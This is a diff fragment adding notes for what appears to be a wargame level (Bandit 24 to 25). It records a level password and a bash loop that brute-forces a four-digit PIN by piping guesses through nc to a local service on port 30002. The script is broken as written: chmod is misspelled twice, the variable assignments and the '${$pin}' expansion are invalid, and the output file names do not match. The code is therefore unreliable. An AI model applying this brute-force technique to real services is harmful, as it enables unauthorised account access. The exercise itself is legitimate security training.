@@ -199,4 +199,24 @@ UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
 
 bandit 25
 
+cd /tmp
+mkdir ericsupersecret
+chomd 777 ericsupersecret
+touch script.sh
+chomd 777 script.sh
+
+#!/bin/bash
+$pw = UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+
+for pin in {0..9}{0..9}{0..9}{0..9}
+do
+  $attempt = "${pw} ${$pin}"
+  echo $attempt | nc localhost 30002 >> data
+done
+
+sort data.txt | uniq -u
+
+echo UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ | nc localhost 30002
+
+
 */
